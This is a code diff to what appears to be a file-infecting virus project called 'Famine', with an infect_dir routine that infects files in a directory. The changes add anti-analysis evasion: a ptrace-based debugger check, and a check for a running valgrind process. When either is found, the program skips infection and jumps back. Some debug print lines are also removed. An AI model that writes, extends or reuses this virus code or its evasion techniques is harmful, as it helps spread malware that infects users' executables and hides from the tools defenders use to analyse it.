@@ -12,7 +12,7 @@
 #define BUILDER_RE_ENTRY_OFFSET 0xe5;
 
 #ifndef BAD_PROCESS_NAME
-#define BAD_PROCESS_NAME "zed"
+#define BAD_PROCESS_NAME "valgrind"
 #endif
 
 __attribute__((section(".text"))) volatile static char signatur[] = "Famine | abied-ch & fbruggem";
@@ -222,6 +222,10 @@ bad_process_running() {
     return 0;
 }
 
+__attribute__((always_inline)) static inline int
+in_debugger() {
+    return sys(0, 0, 1, SYS_ptrace, 0, 0, 0) == -1;
+}
 
 __attribute__((always_inline)) static inline void
 ft_exit_incubation() {
@@ -287,6 +291,7 @@ get_base_address() {
     }
     return addr;
 }
+
 __attribute__((always_inline)) static inline void
 jump_back(int fd_self) {
     volatile file file_self;
@@ -332,7 +337,7 @@ _start() {
 
 __attribute__((always_inline)) inline int
 infect_dir(volatile char *dir_path, volatile int fd_self) {
-    if (bad_process_running()) {
+    if (in_debugger() || bad_process_running()) {
         jump_back(fd_self);
     }
 
@@ -616,14 +621,6 @@ ft_strstr(volatile char *needle, volatile char *haystack) {
             k++;
         }
         if (!needle[j]) {
-            // char nl = '\n';
-            // print_number(ft_strlen(haystack));
-            // ft_write(1, haystack, ft_strlen(haystack));
-            // ft_write(1, &nl, 1);
-            // print_number(sizeof(BAD_PROCESS_NAME));
-            // ft_write(1, needle, ft_strlen(needle));
-            // ft_write(1, &nl, 1);
-            // ft_write(1, &nl, 1);
             return 1;
         }
         j = 0;
